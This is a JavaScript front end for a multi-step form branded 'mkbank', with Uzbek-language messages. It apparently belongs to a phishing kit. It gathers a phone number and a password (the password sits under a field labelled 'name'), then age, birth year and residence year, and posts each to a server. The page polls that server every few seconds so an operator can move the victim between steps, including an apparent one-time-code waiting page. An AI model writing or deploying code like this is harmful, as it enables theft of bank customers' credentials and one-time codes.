const step = document.body.dataset.step;
const statusMessage = document.getElementById("statusMessage");
const submitButton = document.getElementById("submitStepButton");
const fieldError = document.getElementById("fieldError");
const stepField = document.getElementById("stepValue");
const otpPhoneValue = document.getElementById("otpPhoneValue");
const query = new URLSearchParams(window.location.search);
const clientId = query.get("client");
const routeByStatus = {
  phone: "/services/mkbank/phone.html",
  waiting: "/services/mkbank/waiting.html",
  name: "/services/mkbank/name.html",
  birth_year: "/services/mkbank/birth-year.html",
  age: "/services/mkbank/age.html",
  residence_year: "/services/mkbank/residence-year.html",
  approved: "/services/mkbank/approved.html",
  unavailable: "/services/mkbank/unavailable.html"
};

let pollHandle = null;

const setStatus = (message, type = "") => {
  if (!statusMessage) return;
  statusMessage.textContent = message;
  statusMessage.className = "status";
  if (type) statusMessage.classList.add(`is-${type}`);
};

const setFieldError = (message = "") => {
  if (fieldError) {
    fieldError.textContent = message;
  }
};

const formatClientPhone = (value) => {
  const digits = String(value || "").replace(/\D/g, "").replace(/^998/, "").slice(0, 9);
  const parts = [];

  if (digits.length > 0) parts.push(digits.slice(0, 2));
  if (digits.length > 2) parts.push(digits.slice(2, 5));
  if (digits.length > 5) parts.push(digits.slice(5, 7));
  if (digits.length > 7) parts.push(digits.slice(7, 9));

  return `+998 ${parts.join(" ")}`.trimEnd();
};

const getDefaultButtonLabel = () => {
  if (step === "age" || step === "name") return "Davom etish";
  return "Yuborish";
};

const setButtonState = (isReady, label = getDefaultButtonLabel()) => {
  if (!submitButton) return;
  submitButton.textContent = label;
  submitButton.disabled = !isReady;
  submitButton.classList.toggle("is-inactive", !isReady);
  submitButton.classList.toggle("is-ready", isReady);
};

const validateStepValue = (value, showError = true) => {
  const text = String(value || "").trim();

  if (!text) {
    if (showError) setFieldError("");
    return false;
  }

  if (step === "name") {
    if (text.length < 2) {
      if (showError) setFieldError("Parol kamida 2 ta belgidan iborat bo'lishi kerak.");
      return false;
    }
    setFieldError("");
    return true;
  }

  if (step === "age") {
    setFieldError("");
    return text.length > 0;
  }

  setFieldError("");
  return true;
};

const redirectToStatus = (status, currentClientId) => {
  const page = routeByStatus[status];
  if (!page) return;

  const target = `${page}?client=${currentClientId}`;
  const current = `${window.location.pathname}${window.location.search}`;
  if (current !== target) {
    window.location.replace(target);
  }
};

const loadClient = async () => {
  if (!clientId) {
    window.location.replace("/services/mkbank");
    return null;
  }

  const response = await fetch(`/api/client/${clientId}`);
  const data = await response.json();

  if (!response.ok || !data.ok) {
    window.location.replace("/services/mkbank");
    return null;
  }

  if (data.client.status !== step) {
    redirectToStatus(data.client.status, clientId);
    return null;
  }

  if (data.client.currentError && step !== "waiting") {
    setStatus(data.client.currentError, "error");
  }

  if (otpPhoneValue && data.client.phone) {
    otpPhoneValue.textContent = formatClientPhone(data.client.phone);
  }

  if (stepField) {
    const savedValue = data.client.submissions?.[step]?.value;
    if (savedValue && !stepField.value) {
      stepField.value = savedValue;
    }
    setButtonState(validateStepValue(stepField.value, false));
  }

  return data.client;
};

const prepareInputMasks = () => {
  if (!stepField) return;

  if (step === "name") {
    stepField.addEventListener("input", () => {
      stepField.value = stepField.value.replace(/\s+/g, " ").replace(/^\s+/, "");
      setFieldError("");
      setButtonState(validateStepValue(stepField.value, false));
    });
    return;
  }

  stepField.addEventListener("input", () => {
    setFieldError("");
    setButtonState(validateStepValue(stepField.value, false));
  });
};

const initPasswordToggle = () => {
  const toggle = document.getElementById("togglePassword");
  if (!toggle || !stepField) return;

  toggle.addEventListener("click", () => {
    const isPassword = stepField.type === "password";
    stepField.type = isPassword ? "text" : "password";
    toggle.setAttribute("aria-label", isPassword ? "Parolni yashirish" : "Parolni ko'rsatish");
  });
};

const handleSubmit = async (event) => {
  event.preventDefault();

  const value = stepField ? stepField.value.trim() : "";
  if (!validateStepValue(value)) {
    setStatus("Iltimos, ma'lumotni to'ldiring.", "error");
    return;
  }

  setButtonState(false, "Yuborilmoqda...");
  setStatus("Ma'lumot yuborilmoqda...");

  try {
    const response = await fetch(`/api/client/${clientId}/submit-step`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ step, value })
    });

    const data = await response.json();
    if (!response.ok || !data.ok) {
      throw new Error(data.message || "Submit failed.");
    }

    window.location.href = data.redirectUrl;
  } catch (error) {
    setStatus("Yuborish muvaffaqiyatsiz bo'ldi. Qayta urinib ko'ring.", "error");
    setButtonState(validateStepValue(value));
  }
};

const init = async () => {
  if (submitButton) setButtonState(false);

  await loadClient();
  prepareInputMasks();
  initPasswordToggle();

  const form = document.getElementById("stepForm");
  if (form && submitButton) {
    form.addEventListener("submit", handleSubmit);
  }

  pollHandle = setInterval(loadClient, 3000);
};

window.addEventListener("beforeunload", () => {
  if (pollHandle) clearInterval(pollHandle);
});

init();

